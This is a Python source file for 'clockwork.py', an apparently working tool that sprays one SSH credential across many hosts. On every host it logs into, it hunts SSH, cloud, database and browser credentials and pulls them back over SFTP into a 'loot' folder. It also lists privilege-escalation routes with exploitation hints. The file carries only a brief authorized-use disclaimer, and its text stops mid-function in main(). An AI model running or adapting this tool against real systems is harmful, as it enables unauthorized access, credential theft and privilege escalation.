#!/usr/bin/env python3
#
"""
clockwork.py

Bulk SSH credential-check tool with lightweight post-login enumeration.

Tries a single username + (password OR private key) against a list of target
IPs, optionally runs a command, enumerates interesting files / privesc paths
on every host it can log into, and writes a clean report to a file. Hosts are
checked concurrently.

FOR AUTHORIZED SECURITY TESTING ONLY. Only run this against systems you own
or have explicit written permission to test. Unauthorized access to computer
systems is illegal in most jurisdictions.

The enumeration payload is READ-ONLY (it never modifies the target), Linux /
POSIX-sh oriented, and NOT stealthy: it spawns many processes and touches many
files, which is loud on any host with auditing/EDR. Non-Linux targets are
fingerprinted (via `uname -s`, falling back to `cmd /c ver` to positively
identify Windows) and their enumeration is skipped automatically, with the
detected OS noted in the report — credential checking still works everywhere.

Requires: paramiko  ->  pip install paramiko

Usage examples:
    # Password auth, no remote command, just check who we can log into
    python3 clockwork.py -t targets.txt -u admin -p 'SuperSecret123'

    # Key auth, run a command on every host that accepts the key
    python3 clockwork.py -t targets.txt -u admin -k ./id_rsa -c "hostname; id"

    # Enumerate loot + run the lightweight privesc checks on each login
    python3 clockwork.py -t targets.txt -u admin -p pass123 --enum --privesc

    # Also pull the flagged high-value files back to ./loot/<host>/
    python3 clockwork.py -t targets.txt -u admin -p pass123 --enum --loot-dir ./loot
"""

from __future__ import annotations

import argparse
import concurrent.futures
import logging
import os
import re
import secrets
import socket
import sys
from datetime import datetime
from pathlib import Path

try:
    import paramiko
except ImportError:
    sys.exit(
        "[!] The 'paramiko' package is required but not installed.\n"
        "    Install it with:  pip install paramiko"
    )

# paramiko logs transport-level warnings to stderr by default; keep the
# console clean and let our own report be the source of truth.
logging.getLogger("paramiko").setLevel(logging.CRITICAL)


# ---------- pretty printing helpers -------------------------------------

class C:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    ORANGE = "\033[38;5;208m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

    @classmethod
    def disable(cls) -> None:
        for name in ("GREEN", "RED", "YELLOW", "ORANGE", "CYAN", "BOLD", "RESET"):
            setattr(cls, name, "")


def init_colors(force_no_color: bool) -> None:
    """Decide whether to emit ANSI colors, and enable them on Windows."""
    no_color = (
        force_no_color
        or "NO_COLOR" in os.environ           # https://no-color.org/
        or not sys.stdout.isatty()            # piped/redirected output
    )
    if no_color:
        C.disable()
        return

    if sys.platform == "win32":
        # Enable virtual-terminal processing so the escape codes render
        # instead of showing up as literal text. Fall back to no color.
        try:
            import ctypes

            kernel32 = ctypes.windll.kernel32
            handle = kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
            mode = ctypes.c_uint32()
            if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                enable_vt = 0x0004  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
                kernel32.SetConsoleMode(handle, mode.value | enable_vt)
            else:
                C.disable()
        except Exception:
            C.disable()


def banner(text: str) -> str:
    line = "=" * len(text)
    return f"{line}\n{text}\n{line}"


ASCII_ART = r"""
   _____
  / ____||    __    __ |         __      |
 | |     |   /  \  /  \|  /|  | /  \ |__ |  /
 | |     |  | () ||    | / |/\|| () ||  \| /
 | |____ |   \__/  \__/| \      \__/ |   | \
  \_____||             |  \              |  \
         |__|
"""


# ---------- enumeration knowledge base -------------------------------------

# High-value files worth flagging (and pulling back with --loot-dir).
# These are placed unquoted into a `for` loop, so the remote shell expands
# $HOME. Keep them shell-safe (no spaces); browser stores with spaces in the
# path are handled separately via `find` below.
LOOT_PATHS = [
    "$HOME/.ssh/id_rsa", "$HOME/.ssh/id_dsa", "$HOME/.ssh/id_ecdsa",
    "$HOME/.ssh/id_ed25519", "$HOME/.ssh/config", "$HOME/.ssh/known_hosts",
    "$HOME/.ssh/authorized_keys",
    "$HOME/.aws/credentials", "$HOME/.config/gcloud/credentials.db",
    "$HOME/.azure/accessTokens.json", "$HOME/.kube/config",
    "$HOME/.docker/config.json",
    "$HOME/.bash_history", "$HOME/.zsh_history", "$HOME/.mysql_history",
    "$HOME/.psql_history", "$HOME/.python_history",
    "$HOME/.netrc", "$HOME/.git-credentials", "$HOME/.pgpass",
    "$HOME/.my.cnf", "$HOME/.npmrc", "$HOME/.pypirc", "$HOME/.env",
    "$HOME/.password-store",
]

# SUID/SGID binaries GTFOBins lists as a trivial path to privesc.
GTFOBINS_SUID = {
    "arp", "awk", "base64", "bash", "busybox", "cat", "chmod", "chown",
    "chroot", "cp", "cpulimit", "curl", "cut", "dd", "dmesg", "docker",
    "ed", "emacs", "env", "expect", "find", "flock", "gawk", "gdb", "git",
    "grep", "head", "ionice", "journalctl", "less", "make", "mawk", "more",
    "mount", "mv", "nano", "nmap", "node", "nohup", "openssl", "perl", "php",
    "pico", "pkexec", "python", "python2", "python3", "rsync", "ruby", "rvim",
    "sed", "setarch", "sh", "socat", "sort", "start-stop-daemon", "strace",
    "systemctl", "tail", "tar", "taskset", "tee", "vi", "view", "vim",
    "watch", "wget", "xargs", "zip",
}

# Group memberships that hand you (near-)root. Value = why it matters.
DANGEROUS_GROUPS = {
    "docker": ("HIGH", "member of 'docker' -> mount host FS in a container = root"),
    "lxd": ("HIGH", "member of 'lxd' -> spawn a privileged container = root"),
    "lxc": ("HIGH", "member of 'lxc' -> spawn a privileged container = root"),
    "disk": ("HIGH", "member of 'disk' -> raw block-device access = read/write any file"),
    "shadow": ("HIGH", "member of 'shadow' -> read /etc/shadow = crack root hash"),
    "adm": ("INTERESTING", "member of 'adm' -> read system logs (may leak secrets)"),
    "sudo": ("INTERESTING", "member of 'sudo' -> sudo rights (needs the password)"),
    "wheel": ("INTERESTING", "member of 'wheel' -> sudo/su rights (needs the password)"),
}

# Linux capabilities that are directly abusable for privesc.
HOT_CAPS = (
    "cap_setuid", "cap_setgid", "cap_dac_override", "cap_dac_read_search",
    "cap_sys_admin", "cap_sys_ptrace", "cap_sys_module",
)

SEVERITY_ORDER = {"HIGH": 0, "INTERESTING": 1, "INFO": 2}


# ---------- core logic -----------------------------------------------------

def load_key(keyfile: str, passphrase: str | None):
    """Try each supported key type until one parses."""
    if not Path(keyfile).is_file():
        raise ValueError(f"Key file not found: {keyfile}")

    # Resolve types by name so a future paramiko dropping (e.g.) DSSKey
    # degrades gracefully instead of raising AttributeError.
    key_types = [
        getattr(paramiko, name, None)
        for name in ("Ed25519Key", "RSAKey", "ECDSAKey", "DSSKey")
    ]
    key_types = [k for k in key_types if k is not None]
    last_err = None
    for key_cls in key_types:
        try:
            return key_cls.from_private_key_file(keyfile, password=passphrase)
        except paramiko.PasswordRequiredException as e:
            # Correct key type, but it's encrypted and we have no/wrong
            # passphrase. Trying other types would only hide the real cause.
            raise ValueError(
                f"Key '{keyfile}' is encrypted; supply --key-passphrase."
            ) from e
        except Exception as e:  # wrong type / bad passphrase / etc.
            last_err = e
            continue
    raise ValueError(f"Could not load key '{keyfile}' with any known type: {last_err}")


def check_sudo(client, timeout) -> dict:
    """
    Check whether the logged-in user has passwordless (NOPASSWD) sudo access.

    Uses `sudo -n -l`, which never prompts for a password: if one would be
    required, the command just fails immediately instead of hanging the
    session. Returns a dict describing what was found.
    """
    info = {"has_sudo": False, "detail": ""}
    try:
        stdin, stdout, stderr = client.exec_command("sudo -n -l", timeout=timeout)
        # Drain both streams before waiting on the exit status, otherwise a
        # full channel window could deadlock the remote against us.
        out = stdout.read().decode(errors="replace").strip()
        err = stderr.read().decode(errors="replace").strip()
        exit_status = stdout.channel.recv_exit_status()

        if exit_status == 0 and out:
            info["has_sudo"] = True
            info["detail"] = out
        else:
            info["has_sudo"] = False
            info["detail"] = err or out or "sudo access denied or a password is required"
    except Exception as e:
        info["has_sudo"] = False
        info["detail"] = f"Could not run sudo check: {e}"

    return info


# ---------- enumeration ----------------------------------------------------

def build_enum_script(do_enum: bool, do_privesc: bool, token: str) -> str:
    """
    Assemble a single READ-ONLY POSIX-sh payload. Output is split into
    ###<token>:SECTION### blocks that parse_sections() splits on. The random
    token makes a marker collision with real file/command output effectively
    impossible. Bundling everything into one exec keeps it to a single SSH
    round-trip per host.
    """
    blocks = [r"""if command -v timeout >/dev/null 2>&1; then TMO='timeout 15'; else TMO=''; fi"""]

    def add(name: str, body: str) -> None:
        blocks.append('echo "###%s:%s###"' % (token, name))
        blocks.append(body)

    # Context (collected whenever either tier is enabled).
    add("OS", "uname -a 2>/dev/null\n"
              "grep -E '^(PRETTY_NAME|VERSION_ID)=' /etc/os-release 2>/dev/null")
    add("ID", "id 2>/dev/null")

    if do_enum:
        add("LISTEN", "(ss -tlnH 2>/dev/null || netstat -tln 2>/dev/null) | head -n 30")
        loot = "for p in " + " ".join(LOOT_PATHS) + r"""; do
  if [ -f "$p" ]; then echo "F|$(wc -c < "$p" 2>/dev/null)|$p";
  elif [ -d "$p" ]; then echo "D|-|$p"; fi
done
$TMO find "$HOME/.mozilla" "$HOME/.config/google-chrome" "$HOME/.config/chromium" -maxdepth 4 -type f \( -name logins.json -o -name key4.db -o -name "Login Data" \) 2>/dev/null | while read -r p; do echo "F|$(wc -c < "$p" 2>/dev/null)|$p"; done"""
        add("LOOT", loot)

    if do_privesc:
        add("SUDOV", "sudo -V 2>/dev/null | head -n 1")
        add("SUDO", "sudo -n -l 2>/dev/null")
        add("SUID", "$TMO find / -perm -4000 -type f 2>/dev/null | head -n 200")
        add("CAPS", "$TMO getcap -r / 2>/dev/null | head -n 100")
        add("WRITABLE", r"""[ -w /etc/passwd ] && echo passwd_writable
[ -r /etc/shadow ] && echo shadow_readable
[ -w /etc/shadow ] && echo shadow_writable
[ -w /etc/sudoers ] && echo sudoers_writable""")
        add("CRON", r"""for f in /etc/crontab /etc/cron.d/* /etc/cron.hourly/* /etc/cron.daily/*; do
  [ -f "$f" ] && [ -w "$f" ] && echo "$f"
done 2>/dev/null""")
        add("NFS", "grep -v '^#' /etc/exports 2>/dev/null | grep no_root_squash")
        add("DOCKERSOCK", '[ -S /var/run/docker.sock ] && [ -w /var/run/docker.sock ] && echo writable')
        add("PKEXEC", "command -v pkexec 2>/dev/null")

    add("END", "true")
    return "\n".join(blocks)


def parse_sections(raw: str, token: str) -> dict:
    """Split enum output into {SECTION: [lines]} on the ###<token>:SECTION### markers."""
    sections: dict[str, list[str]] = {}
    current = None
    prefix = f"###{token}:"
    for line in raw.splitlines():
        stripped = line.strip()
        if stripped.startswith(prefix) and stripped.endswith("###"):
            current = stripped[len(prefix):-3]
            sections[current] = []
        elif current is not None:
            sections[current].append(line)
    return sections


def _nonblank(sections: dict, name: str) -> list:
    """Return the stripped, non-blank lines of a section."""
    return [ln.strip() for ln in sections.get(name, []) if ln.strip()]


def analyze_enum(sections: dict):
    """Turn raw sections into (findings, loot). Each finding is a dict with
    severity / category / title / reason / detail."""
    findings = []
    loot = []

    def add(sev, cat, title, reason, detail=""):
        findings.append({"severity": sev, "category": cat, "title": title,
                         "reason": reason, "detail": detail})

    # --- context ---
    os_line = "\n".join(_nonblank(sections, "OS")).strip()
    if os_line:
        add("INFO", "context", "Host", "", os_line)

    id_line = " ".join(sections.get("ID", [])).strip()
    if id_line:
        add("INFO", "context", "Identity", "", id_line)
    if "uid=0(" in id_line:
        add("HIGH", "context", "Session is already root", "Logged in as uid=0.", id_line)

    groups_part = id_line.split("groups=", 1)[1] if "groups=" in id_line else ""
    groups = set(re.findall(r"\d+\(([^)]+)\)", groups_part))
    for grp, (sev, why) in DANGEROUS_GROUPS.items():
        if grp in groups:
            add(sev, "groups", f"In '{grp}' group", why)

    # --- loot (enum tier) ---
    for line in _nonblank(sections, "LOOT"):
        if "|" not in line:
            continue
        parts = line.split("|", 2)
        if len(parts) != 3:
            continue
        typ, size, path = parts
        loot.append({"type": typ, "size": size, "path": path})
    if loot:
        detail = "\n".join(
            f"{it['path']} ({it['size']} bytes)" if it["type"] == "F" else f"{it['path']} (dir)"
            for it in loot
        )
        add("INTERESTING", "loot", f"{len(loot)} high-value file(s)/dir(s)",
            "Credentials / keys / history worth reviewing (pull with --loot-dir).", detail)

    listen = _nonblank(sections, "LISTEN")
    if listen:
        add("INFO", "network", f"{len(listen)} listening socket(s)",
            "Possible internal services / pivot points.", "\n".join(listen))

    # --- privesc tier ---
    sudo_lines = _nonblank(sections, "SUDO")
    if sudo_lines:
        add("HIGH", "sudo", "Passwordless sudo (sudo -n -l)",
            "Can run sudo without a password.", "\n".join(sudo_lines))

    sudov = " ".join(sections.get("SUDOV", [])).strip()
    if sudov:
        vm = re.search(r"[Vv]ersion\s+(\d+)\.(\d+)\.(\d+)", sudov)
        if vm:
            t = tuple(int(x) for x in vm.groups())
            vuln = (1, 8, 2) <= t <= (1, 8, 31) or (1, 9, 0) <= t <= (1, 9, 5)
            ver = ".".join(map(str, t))
            if vuln:
                add("INTERESTING", "sudo", f"Sudo {ver} may be vulnerable",
                    "In range for CVE-2021-3156 (Baron Samedit); verify exact patch level.", sudov)
            else:
                add("INFO", "sudo", f"Sudo version {ver}", "", sudov)
        else:
            add("INFO", "sudo", "Sudo version", "", sudov)

    suid = _nonblank(sections, "SUID")
    if suid:
        hits = [p for p in suid if p.rsplit("/", 1)[-1] in GTFOBINS_SUID]
        if hits:
            add("HIGH", "suid", f"{len(hits)} exploitable SUID binary/ies (GTFOBins)",
                "SUID-root binaries with a known GTFOBins privesc.", "\n".join(hits))
        add("INFO", "suid", f"{len(suid)} SUID binary/ies total", "", "\n".join(suid))

    caps = _nonblank(sections, "CAPS")
    if caps:
        hot = [c for c in caps if any(h in c.lower() for h in HOT_CAPS)]
        if hot:
            add("HIGH", "caps", "Abusable file capabilities",
                "Binaries carrying powerful Linux capabilities.", "\n".join(hot))
        else:
            add("INFO", "caps", f"{len(caps)} file capabilities set", "", "\n".join(caps))

    for tok in _nonblank(sections, "WRITABLE"):
        if tok == "passwd_writable":
            add("HIGH", "files", "/etc/passwd is writable", "Add a root user / blank root's password.")
        elif tok == "shadow_readable":
            add("HIGH", "files", "/etc/shadow is readable", "Crack root/user hashes offline.")
        elif tok == "shadow_writable":
            add("HIGH", "files", "/etc/shadow is writable", "Overwrite root's hash directly.")
        elif tok == "sudoers_writable":
            add("HIGH", "files", "/etc/sudoers is writable", "Grant yourself full sudo.")

    cron = _nonblank(sections, "CRON")
    if cron:
        add("HIGH", "cron", "Writable cron file(s)",
            "Cron runs these as root; inject a command.", "\n".join(cron))

    nfs = _nonblank(sections, "NFS")
    if nfs:
        add("INTERESTING", "nfs", "NFS export with no_root_squash",
            "Mount remotely and drop a SUID-root binary.", "\n".join(nfs))

    if any("writable" in ln for ln in sections.get("DOCKERSOCK", [])):
        add("HIGH", "docker", "Writable /var/run/docker.sock",
            "Container escape to root.")

    if _nonblank(sections, "PKEXEC"):
        add("INFO", "pkexec", "pkexec present",
            "Check for PwnKit (CVE-2021-4034) on unpatched systems.")

    return findings, loot


def download_loot(client, loot, ip, loot_dir, max_bytes):
    """SFTP-pull each flagged file under the size cap into loot_dir/<ip>/."""
    results = []
    try:
        sftp = client.open_sftp()
    except Exception as e:
        return [{"path": "(sftp)", "error": f"could not open SFTP: {e}"}]

    host_dir = Path(loot_dir) / ip.replace(":", "_")
    for item in loot:
        if item["type"] != "F":
            continue
        remote = item["path"]
        try:
            size = int(item["size"])
        except (ValueError, TypeError):
            size = None
        if size is not None and size > max_bytes:
            results.append({"path": remote, "error": f"skipped ({size} > {max_bytes} bytes)"})
            continue
        local = host_dir / remote.lstrip("/")
        try:
            local.parent.mkdir(parents=True, exist_ok=True)
            sftp.get(remote, str(local))
            results.append({"path": remote, "local": str(local), "size": size})
        except Exception as e:
            results.append({"path": remote, "error": str(e)})

    try:
        sftp.close()
    except Exception:
        pass
    return results


def _exec_stdout(client, command, timeout) -> str:
    """Run one command and return its stdout (stripped), or '' on any failure."""
    try:
        stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
        return stdout.read().decode(errors="replace").strip()
    except Exception:
        return ""


def detect_os(client, timeout) -> str:
    """
    Best-effort OS fingerprint over SSH. Returns a normalized label:
    'Linux', 'macOS', 'Windows' (with version if available), a raw `uname -s`
    value for other Unixes (FreeBSD, SunOS, ...), or 'unknown'.
    """
    uname = _exec_stdout(client, "uname -s", timeout)
    if "Linux" in uname:
        return "Linux"
    if "Darwin" in uname:
        return "macOS"
    if uname:
        # Cygwin/MSYS/Git-Bash on a Windows host still report via uname.
        if any(tag in uname for tag in ("MINGW", "CYGWIN", "MSYS")):
            return "Windows"
        return uname.splitlines()[0].strip()

    # uname produced nothing: likely Windows (cmd.exe / PowerShell, where uname
    # doesn't exist) or a shell without coreutils. Positively identify Windows
    # via cmd.exe's `ver`, which works regardless of the SSH default shell.
    ver = _exec_stdout(client, "cmd /c ver", timeout)
    if "Windows" in ver:
        m = re.search(r"\[Version ([\d.]+)\]", ver)  # "...[Version 10.0.17763.107]"
        return f"Windows {m.group(1)}" if m else "Windows"
    return "unknown"


def run_enum(client, timeout, do_enum, do_privesc, loot_dir, loot_max_bytes, ip):
    """Run the enum payload over an open client and return a result dict."""
    enum = {"findings": [], "loot": [], "downloaded": [], "error": None, "skipped": None}
    # The enum payload is Linux/POSIX-sh only. On Windows it produces noise and
    # no findings; on macOS/BSD it half-works (no getcap, no /etc/os-release).
    # Probe first and skip anything that isn't Linux rather than run garbage.
    os_name = detect_os(client, timeout)
    if os_name != "Linux":
        enum["skipped"] = f"{os_name} host (enumeration is Linux-only)"
        return enum

    # The payload runs up to three `timeout 15`-guarded scans (two finds +
    # getcap) back to back, so the channel budget must comfortably exceed
    # their worst-case sum or a slow host loses all of its enum results.
    enum_timeout = max(timeout, 60)
    try:
        token = secrets.token_hex(4)
        script = build_enum_script(do_enum, do_privesc, token)
        stdin, stdout, stderr = client.exec_command(script, timeout=enum_timeout)
        raw = stdout.read().decode(errors="replace")
        sections = parse_sections(raw, token)
        findings, loot = analyze_enum(sections)
        enum["findings"] = findings
        enum["loot"] = loot
        if loot_dir and loot:
            enum["downloaded"] = download_loot(client, loot, ip, loot_dir, loot_max_bytes)
    except Exception as e:
        enum["error"] = f"enum failed: {e}"
    return enum


def try_host(ip, port, username, password, pkey, command, check_sudo_flag,
             timeout, do_enum, do_privesc, loot_dir, loot_max_bytes):
    """
    Attempt one SSH connection. Returns a dict describing the result.
    Safe to call concurrently: each call uses its own SSHClient.
    """
    result = {
        "ip": ip,
        "success": False,
        "error": None,
        "command_output": None,
        "command_error": None,
        "sudo": None,
        "enum": None,
    }

    client = paramiko.SSHClient()
    # Auto-accept unknown host keys (no interactive fingerprint prompt).
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=ip,
            port=port,
            username=username,
            password=password,
            pkey=pkey,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout,
            look_for_keys=False,
            allow_agent=False,
        )
        result["success"] = True

        if command:
            # Isolate command failures: a broken command must not abort the
            # sudo/enum steps or get mistaken for a login failure below.
            try:
                stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
                result["command_output"] = stdout.read().decode(errors="replace").strip()
                result["command_error"] = stderr.read().decode(errors="replace").strip()
            except Exception as e:
                result["command_error"] = f"(command failed: {e})"

        if check_sudo_flag:
            result["sudo"] = check_sudo(client, timeout)

        if do_enum or do_privesc:
            result["enum"] = run_enum(
                client, timeout, do_enum, do_privesc, loot_dir, loot_max_bytes, ip
            )

    except paramiko.AuthenticationException:
        result["error"] = "Authentication failed"
    except (paramiko.SSHException, socket.error, socket.timeout, EOFError) as e:
        result["error"] = f"Connection error: {e}"
    except Exception as e:
        result["error"] = f"Unexpected error: {e}"
    finally:
        client.close()

    return result


# ---------- orchestration --------------------------------------------------

def run_checks(targets, args, pkey):
    """
    Check every target concurrently.

    Returns (results, interrupted). `results` preserves the original target
    order; `interrupted` is True if the user hit Ctrl+C, in which case some
    targets may not have been checked.
    """
    total = len(targets)
    results_by_idx: dict[int, dict] = {}
    interrupted = False

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = {
            pool.submit(
                try_host,
                ip=ip,
                port=args.port,
                username=args.username,
                password=args.password,
                pkey=pkey,
                command=args.command,
                check_sudo_flag=args.check_sudo,
                timeout=args.timeout,
                do_enum=args.enum,
                do_privesc=args.privesc,
                loot_dir=args.loot_dir,
                loot_max_bytes=args.loot_max_bytes,
            ): (idx, ip)
            for idx, ip in enumerate(targets)
        }

        done = 0
        try:
            for fut in concurrent.futures.as_completed(futures):
                idx, ip = futures[fut]
                res = fut.result()
                results_by_idx[idx] = res
                done += 1

                if res["success"]:
                    status = f"{C.GREEN}SUCCESS{C.RESET}"
                    if args.check_sudo and res["sudo"] is not None and res["sudo"]["has_sudo"]:
                        status += f" {C.YELLOW}[passwordless sudo]{C.RESET}"
                    highs = _high_count(res)
                    if highs:
                        status += f" {C.YELLOW}[{highs} HIGH]{C.RESET}"
                else:
                    status = f"{C.RED}FAILED{C.RESET} ({res['error']})"
                print(f"[{done}/{total}] {ip:<20} {status}")
        except KeyboardInterrupt:
            interrupted = True
            print(f"\n{C.YELLOW}[!] Interrupted — cancelling remaining checks "
                  f"and writing a partial report...{C.RESET}")
            for fut in futures:
                fut.cancel()

    # Preserve original target order; drop targets that never ran.
    results = [results_by_idx[i] for i in sorted(results_by_idx)]
    return results, interrupted


def _high_count(res) -> int:
    enum = res.get("enum")
    if not enum:
        return 0
    return sum(1 for f in enum["findings"] if f["severity"] == "HIGH")


def write_report(output_path, results, args, total_targets, interrupted):
    succeeded = [r for r in results if r["success"]]
    failed = [r for r in results if not r["success"]]

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(banner("CLOCKWORK REPORT") + "\n")
        f.write(f"Run time      : {datetime.now():%Y-%m-%d %H:%M:%S}\n")
        f.write(f"Username      : {args.username}\n")
        f.write(f"Auth method   : {'key: ' + args.keyfile if args.keyfile else 'password'}\n")
        f.write(f"Port          : {args.port}\n")
        f.write(f"Command run   : {args.command or '(none)'}\n")
        f.write(f"Sudo check    : {'yes' if args.check_sudo else 'no'}\n")
        f.write(f"Enum          : {'yes' if args.enum else 'no'}\n")
        f.write(f"Privesc checks: {'yes' if args.privesc else 'no'}\n")
        if args.loot_dir:
            f.write(f"Loot dir      : {args.loot_dir}\n")
        f.write(f"Total targets : {total_targets}\n")
        f.write(f"Checked       : {len(results)}\n")
        if interrupted:
            f.write(f"Interrupted   : yes ({total_targets - len(results)} target(s) not checked)\n")
        f.write(f"Succeeded     : {len(succeeded)}\n")
        f.write(f"Failed        : {len(failed)}\n\n")

        # Quick wins: HIGH findings across all hosts, read this first.
        if args.enum or args.privesc:
            highs = [
                (r["ip"], fnd)
                for r in succeeded if r.get("enum")
                for fnd in r["enum"]["findings"] if fnd["severity"] == "HIGH"
            ]
            f.write(banner(f"QUICK WINS — HIGH FINDINGS ({len(highs)})") + "\n\n")
            if not highs:
                f.write("(none)\n\n")
            for ip, fnd in highs:
                line = f"[{ip}] {fnd['title']}"
                if fnd["reason"]:
                    line += f" — {fnd['reason']}"
                f.write(line + "\n")
            f.write("\n")

        f.write(banner(f"SUCCESSFUL LOGINS ({len(succeeded)})") + "\n\n")
        if not succeeded:
            f.write("(none)\n\n")
        for r in succeeded:
            f.write(f"--- {r['ip']} ---\n")
            if args.command:
                f.write("Command stdout:\n")
                f.write((r["command_output"] or "(empty)") + "\n")
                if r["command_error"]:
                    f.write("Command stderr:\n")
                    f.write(r["command_error"] + "\n")
            if args.check_sudo and r["sudo"] is not None:
                verdict = "YES (passwordless sudo)" if r["sudo"]["has_sudo"] else "no"
                f.write(f"Passwordless sudo: {verdict}\n")
                if r["sudo"]["detail"]:
                    f.write("Sudo detail:\n")
                    f.write(r["sudo"]["detail"] + "\n")
            _write_enum_section(f, r.get("enum"))
            f.write("\n")

        f.write(banner(f"FAILED LOGINS ({len(failed)})") + "\n\n")
        if not failed:
            f.write("(none)\n")
        for r in failed:
            f.write(f"{r['ip']:<20} {r['error']}\n")


def _write_enum_section(f, enum):
    if not enum:
        return
    if enum.get("skipped"):
        f.write(f"Enumeration skipped: {enum['skipped']}\n")
        return
    if enum["error"]:
        f.write(f"Enum: {enum['error']}\n")
    findings = sorted(
        enum["findings"], key=lambda x: SEVERITY_ORDER.get(x["severity"], 3)
    )
    if findings:
        f.write("Enumeration:\n")
        for fnd in findings:
            line = f"  [{fnd['severity']}] {fnd['title']}"
            if fnd["reason"]:
                line += f" — {fnd['reason']}"
            f.write(line + "\n")
            if fnd["detail"]:
                for dl in fnd["detail"].splitlines():
                    f.write(f"      {dl}\n")
    if enum["downloaded"]:
        f.write("Loot downloaded:\n")
        for d in enum["downloaded"]:
            if "error" in d:
                f.write(f"  {d['path']} -> {d['error']}\n")
            else:
                size_txt = f"{d['size']} bytes" if d["size"] is not None else "unknown size"
                f.write(f"  {d['path']} -> {d['local']} ({size_txt})\n")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Bulk SSH credential-check + enumeration tool (authorized testing only).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    target_group = parser.add_argument_group("targets")
    target_group.add_argument(
        "-t", "--targets", required=True, metavar="FILE",
        help="File listing the hosts to check, one IP or hostname per line. "
             "Blank lines and lines starting with '#' are ignored. The SSH "
             "port is set globally with --port.")

    auth_group = parser.add_argument_group("authentication")
    auth_group.add_argument(
        "-u", "--username", required=True,
        help="The single SSH username to try against every target.")
    auth = auth_group.add_mutually_exclusive_group(required=True)
    auth.add_argument(
        "-p", "--password",
        help="Password to authenticate with. Mutually exclusive with "
             "--keyfile. Note: this is visible in your shell history and in "
             "the host's process list.")
    auth.add_argument(
        "-k", "--keyfile", metavar="PATH",
        help="Private key file to authenticate with; the key type "
             "(Ed25519/RSA/ECDSA/DSA) is auto-detected. Mutually exclusive "
             "with --password.")
    auth_group.add_argument(
        "--key-passphrase", default=None, metavar="PASS",
        help="Passphrase used to decrypt --keyfile, if it is encrypted.")

    post_group = parser.add_argument_group(
        "post-login actions", "Run on every host that authenticates successfully.")
    post_group.add_argument(
        "-c", "--command", default=None, metavar="CMD",
        help="Shell command to run after a successful login; its stdout and "
             "stderr are captured into the report. Independent of --enum / "
             "--privesc.")
    post_group.add_argument(
        "--check-sudo", action="store_true",
        help="Run 'sudo -n -l' to detect passwordless (NOPASSWD) sudo without "
             "ever prompting for a password. (Also performed by --privesc.)")
    post_group.add_argument(
        "--enum", action="store_true",
        help="Read-only enumeration: collects host context (OS, id, listening "
             "sockets) and hunts high-value files — SSH and cloud keys, shell "
             "and DB history, .env / .netrc / .git-credentials, and "
             "Firefox/Chrome credential stores — reporting each file's path "
             "and size.")
    post_group.add_argument(
        "--privesc", action="store_true",
        help="Read-only lightweight privilege-escalation checks (a "
             "mini-LinPEAS): passwordless sudo, sudo version (flags the "
             "CVE-2021-3156 range), GTFOBins-exploitable SUID binaries, "
             "abusable file capabilities, writable /etc/passwd|shadow|sudoers, "
             "writable cron jobs, NFS no_root_squash, a writable docker "
             "socket, dangerous group membership, and pkexec presence.")
    post_group.add_argument(
        "--loot-dir", default=None, metavar="DIR",
        help="SFTP-download the high-value files found by --enum into "
             "DIR/<host>/. Implies --enum. Files over --loot-max-bytes are "
             "skipped.")
    post_group.add_argument(
        "--loot-max-bytes", type=int, default=5_000_000, metavar="N",
        help="Maximum size, in bytes, of an individual file that --loot-dir "
             "will download (default 5000000).")

    conn_group = parser.add_argument_group("connection")
    conn_group.add_argument(
        "--port", type=int, default=22,
        help="TCP port to connect to on every target (default 22).")
    conn_group.add_argument(
        "--timeout", type=int, default=10,
        help="Per-host connection/auth timeout in seconds (default 10). "
             "Enumeration is granted a longer internal budget automatically.")
    conn_group.add_argument(
        "--workers", type=int, default=20,
        help="Maximum number of hosts to check concurrently (default 20).")

    out_group = parser.add_argument_group("output")
    out_group.add_argument(
        "-o", "--output", default=None, metavar="FILE",
        help="Path to write the full text report to "
             "(default: clockwork_<timestamp>.txt in the current directory).")
    out_group.add_argument(
        "--no-color", action="store_true",
        help="Disable ANSI colors. Colors are also disabled automatically "
             "when output is not a TTY or when NO_COLOR is set.")

    args = parser.parse_args()

    if args.workers < 1:
        parser.error("--workers must be at least 1")
    if args.timeout < 1:
        parser.error("--timeout must be at least 1")
    if args.loot_max_bytes < 1:
        parser.error("--loot-max-bytes must be at least 1")

    init_colors(args.no_color)

    # Loot pulls its file list from the enum stage, so it implies --enum.
    if args.loot_dir:
        try:
            Path(args.loot_dir).mkdir(parents=True, exist_ok=True)
        except OSError as e:
            sys.exit(f"[!] Cannot create loot dir {args.loot_dir}: {e}")
        if not args.enum:
            args.enum = True

    targets_path = Path(args.targets)
    if not targets_path.is_file():
        sys.exit(f"[!] Targets file not found: {args.targets}")

    # Keep blank/comment-free lines, de-duplicated but in file order.
    seen = set()
    targets = []
    for line in targets_path.read_text(encoding="utf-8").splitlines():
        host = line.strip()
        if not host or host.startswith("#") or host in seen:
            continue
        seen.add(host)
        targets.append(host)
    if not targets:
        sys.exit("[!] No targets found in targets file.")

    pkey = None
    if args.keyfile:
        try:
            pkey = load_key(args.keyfile, args.key_passphrase)
        except ValueError as e:
            sys.exit(f"[!] {e}")

    output_path = args.output or f"clockwork_{datetime.now():%Y%m%d_%H%M%S}.txt"

    print(C.ORANGE + ASCII_ART + C.RESET)
    print(C.BOLD + banner(f"CLOCKWORK — {len(targets)} target(s)") + C.RESET)
    print(f"User: {args.username}   Auth: {'key' if pkey else 'password'}   "
          f"Port: {args.port}   Workers: {args.workers}   "
          f"Command: {args.command or '(none)'}")
    extras = []
    if args.enum:
        extras.append("enum")
    if args.privesc:
        extras.append("privesc")
    if args.loot_dir:
        extras.append(f"loot->{args.loot_dir}")
    print(f"Post-login: {', '.join(extras) if extras else '(none)'}\n")

    results, interrupted = run_checks(targets, args, pkey)

    try:
